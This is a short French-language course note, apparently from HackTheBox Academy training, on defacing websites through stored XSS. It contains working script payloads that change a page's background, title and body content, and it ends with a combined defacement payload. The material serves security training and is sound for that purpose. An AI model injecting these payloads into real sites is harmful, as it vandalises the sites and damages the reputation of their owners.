# Defacing via XSS

***

## <mark style="color:red;">**Qu’est-ce que le Defacing ?**</mark>

* **Defacing** : Modification de l’apparence d’un site web pour les visiteurs.
* Utilisé par des hackers pour :
  * Revendiquer une intrusion réussie.
  * Diffuser un message ou une revendication.
  * Affecter la réputation d’une organisation.
* **Exemple notable** : Défiguration du site de la NHS britannique en 2018.

***

## <mark style="color:red;">**Exploitation des Vulnérabilités XSS pour le Defacing**</mark>

**Types de XSS Utilisés**

* Les attaques de defacing s’appuient principalement sur les **XSS stockés**, car ils permettent une persistance à travers les rafraîchissements de page et affectent tous les utilisateurs.

***

## <mark style="color:red;">**Éléments HTML pour Modifier une Page**</mark>

1. **Couleur de fond** :
   * Utilisation de `document.body.style.background` ou `document.body.background`.
   *   Exemple de payload :

       ```html
       <script>document.body.style.background = "#141d2b"</script>
       ```
   *   Peut aussi utiliser une image :

       {% code overflow="wrap" %}
       ```html
       <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
       ```
       {% endcode %}
2. **Titre de la page** :
   *   Utilisation de `document.title` pour changer le titre affiché sur l’onglet :

       ```html
       <script>document.title = 'HackTheBox Academy'</script>
       ```
3. **Texte de la page** :
   *   Modification avec `innerHTML` pour changer le contenu d’un élément HTML :

       ```javascript
       document.getElementById("todo").innerHTML = "Texte modifié";
       ```
   *   Modification de tout le contenu du corps de la page :

       ```javascript
       document.getElementsByTagName('body')[0].innerHTML = "Nouveau contenu";
       ```

***

## <mark style="color:red;">**Création d’un Payload Complet pour le Defacing**</mark>

*   Exemple de payload combinant plusieurs modifications :

    {% code overflow="wrap" fullWidth="true" %}
    ```html
    <script>
      document.body.style.background = "#141d2b";
      document.title = 'HackTheBox Academy';
      document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px"></p></center>';
    </script>
    ```
    {% endcode %}

***
